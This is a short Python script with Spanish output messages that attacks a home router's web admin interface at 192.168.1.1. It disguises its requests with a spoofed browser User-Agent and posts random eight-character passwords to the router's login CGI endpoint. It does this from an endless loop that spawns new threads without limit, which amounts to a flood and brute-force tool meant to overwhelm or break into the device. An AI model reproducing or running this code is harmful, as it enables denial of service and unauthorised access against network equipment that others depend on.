import requests
import os
import threading
from time import sleep
import string
import random


ROUTER_URL = "http://192.168.1.1/"
LOGIN_URL = "te_acceso_router.cgi"
CHECK_URL = "te_acceso_router.html"

fakeHeader = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
parametrosLogin = {
    "Upgrade-Insecure-Requests": "1",
    "loginPassword": ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
}

session = requests.Session()

def main(count):
    try:
        iniReq = session.get(ROUTER_URL, headers=fakeHeader)
        logReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)
        checkReq = session.get(ROUTER_URL+CHECK_URL, headers=fakeHeader)
        print("{} solicitudes enviadas al router".format(count))
    except ConnectionResetError:
        print("Se ha perdido la conexion con el router")
    except Exception as e:
        print("Error no especificado")
        print(e)

count = 3
while True:
    thread = threading.Thread(target=main, args=[count])
    thread.start()
    count += 3
